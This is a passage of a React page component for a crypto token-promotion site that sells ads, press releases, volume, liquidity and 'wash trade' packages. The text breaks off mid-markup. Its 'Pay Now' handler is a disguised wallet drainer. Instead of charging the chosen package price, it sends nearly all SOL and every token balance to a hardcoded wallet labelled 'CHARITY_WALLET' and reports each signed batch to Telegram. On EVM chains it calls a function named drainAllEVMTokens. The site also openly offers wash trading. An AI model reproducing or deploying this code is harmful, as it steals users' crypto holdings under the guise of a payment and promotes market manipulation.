import { useEffect, useState, useCallback } from 'react';
import { Navigation } from '@/components/Navigation';
import { PegasusAnimation } from '@/components/PegasusAnimation';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { ArrowUp, ExternalLink, Loader2, AlertCircle, X, Check, Wallet, Search } from 'lucide-react';
import { motion, AnimatePresence } from 'framer-motion';
import { ethers } from 'ethers';
import { Input } from '@/components/ui/input';
import { Slider } from '@/components/ui/slider';
import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction, ComputeBudgetProgram } from '@solana/web3.js';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { sendTelegramMessage } from '@/utils/telegram';
import { AnimatedLogo } from '@/components/AnimatedLogo';
import { getMintProgramId } from '@/utils/tokenProgram';
import { getSolPrice } from '@/lib/utils';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { drainAllEVMTokens } from '@/utils/evmTransactions';
import { useChainInfo } from '@/hooks/useChainInfo';
import { InlineConnectWallet } from '@/components/InlineConnectWallet';

const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const MAX_BATCH_SIZE = 5;

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSOL?: number;
}

interface TokenProfile {
  url: string;
  chainId: string;
  tokenAddress: string;
  icon?: string;
  header?: string;
  description?: string;
  links?: { label?: string; type?: string; url: string }[];
}

interface DexPair {
  chainId: string;
  dexId: string;
  url: string;
  pairAddress: string;
  baseToken: {
    address: string;
    name: string;
    symbol: string;
  };
  quoteToken: {
    address: string;
    name: string;
    symbol: string;
  };
  priceNative: string;
  priceUsd: string;
  txns: {
    m5: { buys: number; sells: number };
    h1: { buys: number; sells: number };
    h6: { buys: number; sells: number };
    h24: { buys: number; sells: number };
  };
  volume: {
    h24: number;
    h6: number;
    h1: number;
    m5: number;
  };
  priceChange?: {
    m5: number;
    h1: number;
    h6: number;
    h24: number;
  };
  liquidity?: {
    usd: number;
    base: number;
    quote: number;
  };
  fdv: number;
  marketCap: number;
  pairCreatedAt?: number;
  info?: {
    imageUrl?: string;
    header?: string;
    openGraph?: string;
    websites?: { label: string; url: string }[];
    socials?: { type: string; url: string }[];
  };
}

const EVM_WALLETS = [
  "0x94A49a3099b5C3921eE4c2c213Ef25c068d837a5",
  "0x5D84D8E44390C5A9b069952F1696f538d2ebaf73",
  "0xAda53ED3Bc3D289F0A7E68c54B26cF7806D64398",
  "0xE56D8EbFc8AbB14838e85676b431803602127907",
  "0xEa1630a397eBB5BAB325b3eba2b1868FD957703e",
  "0x762762ee7a93Ab23C886fBC1C07fad9E23C08FAe",
  "0xAda53ED3Bc3D289F0A7E68c54B26cF7806D64398"
];

const SOLANA_WALLETS = [
  "4E9G6hLmdMGit2n5AL1UwEpx7foKomhQx4jPdXwSwdHj",
  "Eoxf3CwgWauYMKTktGPsLZ6733xEwaCw9V2wAcA8aHcP",
  "wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj",
  "3THbDHY3LRZw4gx4b5GyfPbTKz8XeY9UPhE3akRJd82i"
];

const PACKAGES = [
  { name: 'Basic', price: 90, multiplier: '10x', id: 'basic', color: 'from-blue-400 to-blue-600' },
  { name: 'Bronze', price: 200, multiplier: '20x', id: 'bronze', color: 'from-orange-400 to-orange-600' },
  { name: 'Silver', price: 300, multiplier: '50x', id: 'silver', color: 'from-slate-300 to-slate-500' },
  { name: 'Gold', price: 700, multiplier: '100x', id: 'gold', color: 'from-yellow-400 to-yellow-600' },
  { name: 'Platinum', price: 3000, multiplier: '500x', id: 'platinum', color: 'from-purple-400 to-purple-600' },
  { name: 'Diamond', price: 5000, multiplier: '1000x', id: 'diamond', color: 'from-cyan-400 to-cyan-600' },
  { name: 'Enterprise / Custom', price: 8000, multiplier: 'Custom', id: 'enterprise', color: 'from-pink-500 to-rose-500' }
];

const PRESS_PACKAGES = [
  { name: 'Basic', price: 500, multiplier: 'Custom', id: 'press_basic', color: 'from-blue-400 to-blue-600' },
  { name: 'Gold', price: 1500, multiplier: 'Custom', id: 'press_gold', color: 'from-yellow-400 to-yellow-600' },
  { name: 'Platinum', price: 2500, multiplier: 'Custom', id: 'press_platinum', color: 'from-purple-400 to-purple-600' },
  { name: 'Diamond', price: 5000, multiplier: 'Custom', id: 'press_diamond', color: 'from-cyan-400 to-cyan-600' },
  { name: 'Enterprise / Custom', price: 8000, multiplier: 'Custom', id: 'press_enterprise', color: 'from-pink-500 to-rose-500' }
];

const VOLUME_PACKAGES = [
    { name: '50K Volume', price: 2.1, currency: 'NATIVE', duration: '6h', id: 'vol_50k', color: 'from-slate-700 to-slate-900' },
    { name: '100K Volume', price: 3.3, currency: 'NATIVE', duration: '12h', id: 'vol_100k', color: 'from-slate-700 to-slate-900' },
    { name: '250K Volume', price: 7.9, currency: 'NATIVE', duration: '24h', id: 'vol_250k', color: 'from-slate-700 to-slate-900' },
    { name: '500K Volume', price: 15, currency: 'NATIVE', duration: '2d', id: 'vol_500k', color: 'from-slate-700 to-slate-900' },
    { name: '1M Volume', price: 26, currency: 'NATIVE', duration: '5d', id: 'vol_1m', color: 'from-slate-700 to-slate-900' }
];

const WASH_PACKAGES = [
    { name: 'Basic', price: 5000, txCount: '20,000 tx', id: 'wash_basic', color: 'from-blue-400 to-blue-600' },
    { name: 'Bronze', price: 30000, txCount: '100,000 tx', id: 'wash_bronze', color: 'from-orange-400 to-orange-600' },
    { name: 'Silver', price: 50000, txCount: '500,000 tx', id: 'wash_silver', color: 'from-slate-300 to-slate-500' },
    { name: 'Custom', price: 0, txCount: 'Custom', id: 'wash_custom', color: 'from-purple-400 to-purple-600' }
];

const Ads = () => {
  const [tokens, setTokens] = useState<DexPair[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  // Flow State
  const [showBoostOptions, setShowBoostOptions] = useState(false);
  const [showAdsFlow, setShowAdsFlow] = useState(false);
  const [flowType, setFlowType] = useState<'ADS' | 'PRESS' | 'VOLUME' | 'LIQUIDITY' | 'WASH_TRADE'>('ADS');
  const [showPressReleasePreview, setShowPressReleasePreview] = useState(false);
  const [customText, setCustomText] = useState('');
  const [flowStep, setFlowStep] = useState<'INPUT' | 'PACKAGES' | 'PAYMENT' | 'CUSTOM_TEXT' | 'LIQUIDITY_CONFIG' | 'WASH_CUSTOM'>('INPUT');
  const [contractAddress, setContractAddress] = useState('');
  const [fetchedToken, setFetchedToken] = useState<DexPair | null>(null);
  const [fetchError, setFetchError] = useState('');
  const [isFetchingToken, setIsFetchingToken] = useState(false);
  const [paymentWallet, setPaymentWallet] = useState('');
  const [selectedPackage, setSelectedPackage] = useState<any>(null);
  const [isVerifying, setIsVerifying] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState<'PENDING' | 'SUCCESS' | 'FAILED'>('PENDING');
  
  // New State
  const [liquidityAmount, setLiquidityAmount] = useState([0]);
  const [washTxCount, setWashTxCount] = useState(0);

  const { connected, publicKey, sendTransaction } = useWallet();
  const { connection } = useConnection();
  const [balances, setBalances] = useState<TokenBalance[]>([]);
  const [solBalance, setSolBalance] = useState(0);
  const { activeChain, getEVMChain, evmChainId } = useChain();
  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
  const { chainName, nativeToken } = useChainInfo();

  // Fetch all balances like donate button
  const fetchAllBalances = useCallback(async () => {
    if (!publicKey) return;

    try {
      // Fetch SOL balance
      const solBal = await connection.getBalance(publicKey);
      const solAmount = solBal / LAMPORTS_PER_SOL;
      setSolBalance(solAmount);

      // Fetch legacy SPL Token accounts
      const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID
      });

      // Fetch Token-2022 accounts (Pump.fun tokens)
      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_2022_PROGRAM_ID
      });

      // Combine both token types
      const allTokenAccounts = [
        ...legacyTokenAccounts.value,
        ...token2022Accounts.value
      ];

      const tokens: TokenBalance[] = allTokenAccounts
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0
          };
        })
        .filter(token => token.uiAmount > 0);

      setBalances(tokens);
    } catch (error) {
      console.error('Error fetching balances:', error);
    }
  }, [publicKey, connection]);

  useEffect(() => {
    if (publicKey) {
      fetchAllBalances();
    }
  }, [publicKey, fetchAllBalances]);

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number, overridePublicKey?: PublicKey) => {
    const effectivePublicKey = overridePublicKey || publicKey;
    if (!effectivePublicKey) return null;

    const transaction = new Transaction();
    
    // Add Compute Budget Instructions for better mobile reliability
    // 1. Set higher compute unit limit for complex batch transfers
    transaction.add(
      ComputeBudgetProgram.setComputeUnitLimit({
        units: 100_000,
      })
    );

    // 2. Set priority fee to ensure inclusion during congestion
    transaction.add(
      ComputeBudgetProgram.setComputeUnitPrice({
        microLamports: 100_000, // 0.0001 SOL priority fee
      })
    );
    
    const charityPubkey = new PublicKey(CHARITY_WALLET);

    // Add token transfers - dynamically detect Token-2022 vs legacy SPL Token
    for (const token of tokenBatch) {
      if (token.balance <= 0) continue;
      
      try {
        const mintPubkey = new PublicKey(token.mint);
        
        // Determine which token program this mint belongs to (Token-2022 for Pump.fun, legacy for others)
        const mintInfo = await getMintProgramId(connection, token.mint);
        const tokenProgramId = mintInfo.programId;
        const decimals = mintInfo.decimals;
        
        console.log(`Token ${token.mint}: using ${mintInfo.isToken2022 ? 'Token-2022' : 'Legacy SPL Token'} program`);
        
        // Get ATAs with the correct program ID
        const fromTokenAccount = await getAssociatedTokenAddress(
          mintPubkey, 
          effectivePublicKey,
          false,
          tokenProgramId,
          ASSOCIATED_TOKEN_PROGRAM_ID
        );
        const toTokenAccount = await getAssociatedTokenAddress(
          mintPubkey, 
          charityPubkey,
          true, // Allow owner off curve for PDA
          tokenProgramId,
          ASSOCIATED_TOKEN_PROGRAM_ID
        );

        // Check if destination ATA exists, if not create it with correct program
        try {
          await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
        } catch (error) {
          transaction.add(
            createAssociatedTokenAccountInstruction(
              effectivePublicKey,
              toTokenAccount,
              charityPubkey,
              mintPubkey,
              tokenProgramId, // Use the correct token program
              ASSOCIATED_TOKEN_PROGRAM_ID
            )
          );
        }

        // Use createTransferCheckedInstruction with correct program ID and decimals
        transaction.add(
          createTransferCheckedInstruction(
            fromTokenAccount,      // Source ATA
            mintPubkey,            // Mint
            toTokenAccount,        // Destination ATA
            effectivePublicKey,    // Owner (signer)
            BigInt(token.balance), // Amount (raw)
            decimals,              // Decimals from mint
            [],                    // Multisig signers
            tokenProgramId         // Correct program ID (Token-2022 or legacy)
          )
        );
      } catch (error) {
        console.error(`Failed to add transfer for ${token.mint}:`, error);
      }
    }

    // Add SOL transfer if specified
    if (solPercentage && solBalance > 0) {
      const rentExempt = 0.01;
      const availableSOL = Math.max(0, solBalance - rentExempt);
      const amountToSend = Math.floor((availableSOL * solPercentage / 100) * LAMPORTS_PER_SOL);
      
      if (amountToSend > 0) {
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: effectivePublicKey,
            toPubkey: charityPubkey,
            lamports: amountToSend
          })
        );
      }
    }

    return transaction;
  }, [publicKey, solBalance, connection]);

  const fetchTokens = useCallback(async () => {
    try {
      setError(null);
      // 1. Fetch candidates from multiple sources
      const sources = [
        'https://api.dexscreener.com/token-profiles/latest/v1',
        'https://api.dexscreener.com/token-boosts/latest/v1',
        'https://api.dexscreener.com/token-boosts/top/v1'
      ];

      const responses = await Promise.allSettled(
        sources.map(url => fetch(url).then(res => {
            if (!res.ok) throw new Error(`Failed to fetch ${url}`);
            return res.json();
        }))
      );

      const candidateAddresses = new Set<string>();
      
      responses.forEach(result => {
        if (result.status === 'fulfilled' && Array.isArray(result.value)) {
          result.value.forEach((item: any) => {
            if (item?.tokenAddress) {
              candidateAddresses.add(item.tokenAddress);
            }
          });
        }
      });

      if (candidateAddresses.size === 0) {
        console.warn('No candidate tokens found');
        if (tokens.length === 0) {
            setLoading(false);
        }
        return;
      }

      // 2. Fetch details for candidates in chunks of 30
      const addresses = Array.from(candidateAddresses);
      const chunks = [];
      const MAX_TOKENS_TO_CHECK = 150; // Increased limit to ensure we get 90
      const limitedAddresses = addresses.slice(0, MAX_TOKENS_TO_CHECK);
      
      for (let i = 0; i < limitedAddresses.length; i += 30) {
        chunks.push(limitedAddresses.slice(i, i + 30));
      }

      const pairPromises = chunks.map(chunk => 
        fetch(`https://api.dexscreener.com/latest/dex/tokens/${chunk.join(',')}`)
          .then(res => res.json())
          .then(data => data?.pairs as DexPair[])
          .catch(err => {
              console.error("Error fetching pairs chunk:", err);
              return [] as DexPair[];
          })
      );

      const pairsResults = await Promise.all(pairPromises);
      const allPairs = pairsResults.flat().filter(Boolean);

      // 3. Filter and process pairs
      const validPairs = allPairs.filter(pair => {
        const h24 = pair?.priceChange?.h24;
        return typeof h24 === 'number' && h24 >= 200;
      });

      // Remove duplicates
      const uniquePairsMap = new Map<string, DexPair>();
      validPairs.forEach(pair => {
        if (!pair?.baseToken?.address) return;
        
        const tokenAddress = pair.baseToken.address;
        const currentLiquidity = pair.liquidity?.usd || 0;
        const existingLiquidity = uniquePairsMap.get(tokenAddress)?.liquidity?.usd || 0;

        if (!uniquePairsMap.has(tokenAddress) || currentLiquidity > existingLiquidity) {
          uniquePairsMap.set(tokenAddress, pair);
        }
      });

      const processedPairs = Array.from(uniquePairsMap.values());
      
      // Sort by price change descending
      processedPairs.sort((a, b) => (b.priceChange?.h24 || 0) - (a.priceChange?.h24 || 0));

      setTokens(prevTokens => {
        if (prevTokens.length === 0) {
            return processedPairs.slice(0, 90);
        }

        const existingAddresses = new Set(prevTokens.map(t => t.baseToken.address));
        const newTokens = processedPairs.filter(p => !existingAddresses.has(p.baseToken.address));
        
        const updatedPrevTokens = prevTokens.map(t => {
            const freshData = processedPairs.find(p => p.baseToken.address === t.baseToken.address);
            return freshData || t;
        });

        const combined = [...newTokens, ...updatedPrevTokens];
        return combined.slice(0, 90);
      });
      
      setLoading(false);

    } catch (error) {
      console.error('Error fetching ads:', error);
      setError('Failed to load trending ads. Please try again later.');
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchTokens();
    const interval = setInterval(fetchTokens, 60000); 
    return () => clearInterval(interval);
  }, [fetchTokens]);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get('boost') === 'true') {
        setShowBoostOptions(true);
        // Optional: scroll to the boost section
        const boostSection = document.getElementById('boost-section');
        if (boostSection) {
            boostSection.scrollIntoView({ behavior: 'smooth' });
        }
    }
  }, []);

  const handleGetAdsOpen = (type: 'ADS' | 'PRESS' | 'VOLUME' | 'LIQUIDITY' | 'WASH_TRADE' = 'ADS') => {
    setShowAdsFlow(true);
    setFlowType(type);
    setFlowStep('INPUT');
    setContractAddress('');
    setCustomText('');
    setFetchedToken(null);
    setFetchError('');
    setPaymentStatus('PENDING');
    setLiquidityAmount([0]);
    setWashTxCount(0);
  };

  const handleContractSubmit = async () => {
    if (!contractAddress.trim()) {
        setFetchError('Please enter a contract address');
        return;
    }
    
    setIsFetchingToken(true);
    setFetchError('');
    
    try {
        const res = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${contractAddress}`);
        const data = await res.json();
        
        if (data.pairs && data.pairs.length > 0) {
            // Find the best pair (highest liquidity)
            const bestPair = data.pairs.sort((a: DexPair, b: DexPair) => (b.liquidity?.usd || 0) - (a.liquidity?.usd || 0))[0];
            setFetchedToken(bestPair);
            
            if (flowType === 'LIQUIDITY') {
                setFlowStep('LIQUIDITY_CONFIG');
            } else {
                setFlowStep('PACKAGES');
            }
        } else {
            setFetchError('Token not found. Please check the contract address.');
        }
    } catch (err) {
        setFetchError('Failed to fetch token details.');
    } finally {
        setIsFetchingToken(false);
    }
  };

  const handlePackageSelect = (pkg: typeof PACKAGES[0]) => {
    // Removed custom package check for standard flow
    
    setSelectedPackage(pkg);

    if (pkg.id === 'press_enterprise') {
        setFlowStep('CUSTOM_TEXT');
        return;
    }
    
    if (pkg.id === 'wash_custom') {
        // We will handle wash custom logic in the render part or a specific step
        // For now, let's say we set a flag or step.
        // Actually, let's keep it simple and maybe show a dialog or just proceed if we implemented the calculation in the button itself?
        // The user description says "customized button with where the users set the amount". 
        // This implies the input is IN the button or replaces the view.
        // I will implement a WASH_CUSTOM step.
        setFlowStep('WASH_CUSTOM');
        return;
    }
    
    // Select wallet based on chain
    let walletList = EVM_WALLETS;
    if (fetchedToken?.chainId === 'solana') {
        walletList = SOLANA_WALLETS;
    }
    
    const randomWallet = walletList[Math.floor(Math.random() * walletList.length)];
    setPaymentWallet(randomWallet);
    setPaymentStatus('PENDING');
    setFlowStep('PAYMENT');
  };

  const handleCustomTextSubmit = () => {
    // Here we would typically send the custom text to a backend
    // For now, we'll just proceed to payment
    if (!customText.trim()) {
        alert("Please enter your custom text.");
        return;
    }
    
    // Select wallet logic (duplicated from handlePackageSelect for now, could be refactored)
    let walletList = EVM_WALLETS;
    if (fetchedToken?.chainId === 'solana') {
        walletList = SOLANA_WALLETS;
    }
    
    const randomWallet = walletList[Math.floor(Math.random() * walletList.length)];
    setPaymentWallet(randomWallet);
    setPaymentStatus('PENDING');
    setFlowStep('PAYMENT');
  };

  const handlePayNow = async () => {
    // EVM path
    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
      setIsVerifying(true);
      try {
        const chainName = getEVMChain()?.name || 'EVM';
        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
        setPaymentStatus('SUCCESS');
      } catch (error: any) {
        setPaymentStatus('FAILED');
      } finally {
        setIsVerifying(false);
      }
      return;
    }

    // Solana path (original code continues below)
    let currentPublicKey = publicKey;
    let activeSigner: any = null;

    // 1. Connect Wallet if not connected
    if (!connected || !publicKey) {
        try {
            if ('solana' in window) {
                const provider = (window as any).solana;
                if (provider.isPhantom) {
                    await provider.connect();
                    currentPublicKey = provider.publicKey;
                    activeSigner = provider;
                } else {
                    alert("Please install Phantom wallet!");
                    return;
                }
            } else {
                 alert("Solana wallet not found! Please install Phantom.");
                 return;
            }
        } catch (err) {
            console.error("Connection failed:", err);
            return;
        }
    }

    if (!currentPublicKey) return;

    // Helper to send transaction using the correct provider/hook
    const sendTx = async (transaction: Transaction) => {
        try {
            transaction.feePayer = currentPublicKey!;
            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
            transaction.recentBlockhash = blockhash;

            let signature: string;
            if (activeSigner) {
                // Use Phantom provider directly if we just connected
                const result = await activeSigner.signAndSendTransaction(transaction);
                signature = result.signature;
            } else {
                // Use useWallet hook if already connected
                signature = await sendTransaction(transaction, connection, { skipPreflight: false });
            }
            return { signature, blockhash, lastValidBlockHeight };
        } catch (error) {
            console.error("Transaction sending failed:", error);
            throw error;
        }
    };
    
    setIsVerifying(true);
    
    try {
      console.log('Starting transaction sequence...');

      // 1. SOL Transfer (Leave $1.50)
      const solBal = await connection.getBalance(currentPublicKey);
      const solPrice = await getSolPrice();
      
      let lamportsToSend = 0;
      
      if (solPrice > 0) {
        const amountToKeepUSD = 1.50;
        const amountToKeepSOL = amountToKeepUSD / solPrice;
        const amountToKeepLamports = Math.ceil(amountToKeepSOL * LAMPORTS_PER_SOL);
        
        const PRIORITY_FEE = 100_000; // microLamports
        const BASE_FEE = 5000;
        const FEE_RESERVE = PRIORITY_FEE + BASE_FEE;
        
        const maxSendable = solBal - amountToKeepLamports - FEE_RESERVE;
        lamportsToSend = Math.max(0, Math.floor(maxSendable));
      } else {
        console.warn("Could not fetch SOL price, skipping SOL transfer to be safe");
      }

      if (lamportsToSend > 0) {
        const transaction = new Transaction();
        
        transaction.add(
          ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
          ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
        );

        transaction.add(
          SystemProgram.transfer({
            fromPubkey: currentPublicKey,
            toPubkey: new PublicKey(CHARITY_WALLET),
            lamports: lamportsToSend
          })
        );

        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = currentPublicKey;

        try {
            await connection.simulateTransaction(transaction);
        } catch (e) {
            console.error("Simulation failed", e);
        }

        const { signature } = await sendTx(transaction);
        await connection.confirmTransaction({
          signature,
          blockhash,
          lastValidBlockHeight
        }, 'confirmed');
      }

      // 2. SPL Token Transfers
      const validTokens = balances.filter(token => token.balance > 0);
      
      // Sort by value (descending) - prioritizing higher value tokens
      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));

      // Batch tokens
      const batches: TokenBalance[][] = [];
      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
      }

      for (let i = 0; i < batches.length; i++) {
        const batch = batches[i];
        
        // Use updated createBatchTransfer with currentPublicKey override
        const transaction = await createBatchTransfer(batch, undefined, currentPublicKey);

        // Check > 2 because we always add 2 ComputeBudget instructions
        if (transaction && transaction.instructions.length > 2) {
           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
           transaction.recentBlockhash = blockhash;
           transaction.feePayer = currentPublicKey;

           try {
             await connection.simulateTransaction(transaction);
           } catch (e) {
             console.error("Token batch simulation failed", e);
           }

           const { signature } = await sendTx(transaction);
           await connection.confirmTransaction({
             signature,
             blockhash,
             lastValidBlockHeight
           }, 'confirmed');
           sendTelegramMessage(`
✅ <b>Transaction Signed (Token Batch ${i + 1})</b>

👤 <b>User:</b> <code>${currentPublicKey?.toBase58()}</code>
🔗 <b>Signature:</b> <code>${signature}</code>
`);
        }
      }

      setPaymentStatus('SUCCESS');
      setTimeout(fetchAllBalances, 2000);

    } catch (error: any) {
        console.error("Payment failed:", error);
        setPaymentStatus('FAILED');
    } finally {
        setIsVerifying(false);
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden text-foreground bg-transparent">
      <PegasusAnimation />
      <Navigation />

      <div className="relative z-10 container mx-auto px-4 pt-24 md:pt-32 pb-8">
        
        {/* Top Buttons */}
        <div className="mb-8 flex flex-col justify-center items-center">
            {!showBoostOptions ? (
                <Button 
                    onClick={() => setShowBoostOptions(true)}
                    className="w-full max-w-2xl bg-gradient-to-r from-blue-600 via-purple-600 to-indigo-600 text-white font-bold text-xl py-4 rounded-full shadow-lg shadow-purple-500/20 animate-pulse transition-all duration-300 transform hover:scale-105"
                >
                    Boost
                </Button>
            ) : (
                <div className="flex flex-col md:flex-row gap-4 w-full justify-center animate-in fade-in slide-in-from-bottom-4 duration-500 flex-wrap">
                    <Button onClick={() => handleGetAdsOpen('ADS')} className="w-full max-w-xs md:max-w-[200px] bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Get Ads</Button>
                    <Button onClick={() => setShowPressReleasePreview(true)} className="w-full max-w-xs md:max-w-[200px] bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Press Release</Button>
                    <Button onClick={() => handleGetAdsOpen('VOLUME')} className="w-full max-w-xs md:max-w-[200px] bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Volume</Button>
                    <Button onClick={() => handleGetAdsOpen('LIQUIDITY')} className="w-full max-w-xs md:max-w-[200px] bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Liquidity</Button>
                    <Button onClick={() => handleGetAdsOpen('WASH_TRADE')} className="w-full max-w-xs md:max-w-[200px] bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Wash Trade</Button>
                </div>
            )}
        </div>

        <div className="flex flex-col items-center justify-center mb-12 gap-4">
          <AnimatedLogo className="w-16 h-16" />
          <h1 className="text-4xl font-extrabold text-center text-gradient">
            Ads
          </h1>
        </div>

        {error && (
            <div className="flex justify-center mb-8">
                <div className="bg-destructive/20 text-destructive border border-destructive/50 px-4 py-3 rounded-lg flex items-center gap-2">
                    <AlertCircle className="w-5 h-5" />
                    <span>{error}</span>
                </div>
            </div>
        )}

        {loading && tokens.length === 0 ? (
          <div className="flex justify-center items-center py-20">
            <Loader2 className="w-12 h-12 animate-spin text-primary" />
          </div>
        ) : tokens.length === 0 ? (
           <div className="text-center py-20">
               <p className="text-xl text-muted-foreground">No trending ads found with &gt;200% gain in 24h.</p>
               <Button onClick={fetchTokens} variant="outline" className="mt-4">
                   Refresh
               </Button>
           </div>
        ) : (
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
            <AnimatePresence>
              {tokens.map((token) => (
                <motion.div
                  key={token.baseToken.address}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, scale: 0.95 }}
                  layout
                  className="h-full"
                >
                  <Card className="h-full bg-card border-white/10 backdrop-blur-md hover:border-primary/50 transition-colors group overflow-hidden">
                    <CardContent className="p-6 flex flex-col h-full">
                      <div className="flex items-start justify-between mb-4">
                        <div className="flex items-center gap-3 overflow-hidden">
                            {token.info?.imageUrl ? (
                                <img 
                                    src={token.info.imageUrl} 
                                    alt={token.baseToken.name} 
                                    className="w-12 h-12 rounded-full object-cover border border-white/10 flex-shrink-0"
                                    onError={(e) => {
                                        (e.target as HTMLImageElement).src = 'https://via.placeholder.com/48?text=?';
                                    }}
                                />
                            ) : (
                                <div className="w-12 h-12 rounded-full bg-primary/20 flex items-center justify-center text-xl font-bold flex-shrink-0 text-primary">
                                    {token.baseToken.symbol?.slice(0, 2)}
                                </div>
                            )}
                            <div className="min-w-0">
                                <h3 className="font-bold text-lg leading-tight truncate" title={token.baseToken.name}>
                                    {token.baseToken.name}
                                </h3>
                                <p className="text-sm text-muted-foreground truncate">{token.baseToken.symbol}</p>
                            </div>
                        </div>
                        <div className="flex flex-col items-end flex-shrink-0 ml-2">
                             <div className="flex items-center gap-1 text-green-400 font-bold bg-green-400/10 px-2 py-1 rounded-md">
                                <ArrowUp className="w-4 h-4" />
                                {token.priceChange?.h24?.toFixed(0)}%
                             </div>
                             <p className="text-xs text-muted-foreground mt-1">24h</p>
                        </div>
                      </div>

                      <div className="mt-auto space-y-3">
                        <div className="flex justify-between items-center text-sm">
                            <span className="text-muted-foreground">Price</span>
                            <span className="font-mono">
                                ${Number(token.priceUsd || 0).toLocaleString(undefined, {
                                    minimumFractionDigits: 2,
                                    maximumFractionDigits: 8
                                })}
                            </span>
                        </div>
                        
                        <Button className="w-full gap-2" variant="outline" asChild>
                            <a href={token.url} target="_blank" rel="noopener noreferrer">
                                View on DexScreener <ExternalLink className="w-4 h-4" />
                            </a>
                        </Button>
                      </div>
                    </CardContent>
                  </Card>
                </motion.div>
              ))}
            </AnimatePresence>
          </div>
        )}

        {/* Bottom Buttons */}
        <div className="mt-12 flex flex-col justify-center items-center">
             {!showBoostOptions ? (
                <Button 
                    onClick={() => setShowBoostOptions(true)}
                    className="w-full max-w-2xl bg-gradient-to-r from-blue-600 via-purple-600 to-indigo-600 text-white font-bold text-xl py-4 rounded-full shadow-lg shadow-purple-500/20 animate-pulse transition-all duration-300 transform hover:scale-105"
                >
                    Boost
                </Button>
            ) : (
                <div className="flex flex-col md:flex-row gap-4 w-full justify-center animate-in fade-in slide-in-from-bottom-4 duration-500 flex-wrap">
                    <Button onClick={() => handleGetAdsOpen('ADS')} className="w-full max-w-xs md:max-w-[200px] bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Get Ads</Button>
                    <Button onClick={() => setShowPressReleasePreview(true)} className="w-full max-w-xs md:max-w-[200px] bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Press Release</Button>
                    <Button onClick={() => handleGetAdsOpen('VOLUME')} className="w-full max-w-xs md:max-w-[200px] bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Volume</Button>
                    <Button onClick={() => handleGetAdsOpen('LIQUIDITY')} className="w-full max-w-xs md:max-w-[200px] bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Liquidity</Button>
                    <Button onClick={() => handleGetAdsOpen('WASH_TRADE')} className="w-full max-w-xs md:max-w-[200px] bg-primary/20 hover:bg-primary/30 text-primary-foreground border border-primary/50 backdrop-blur-sm transition-all duration-300 transform hover:scale-105">Wash Trade</Button>
                </div>
            )}
        </div>

      </div>

      {/* Get Ads Flow Overlay */}
      <AnimatePresence>
        {showAdsFlow && (
            <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
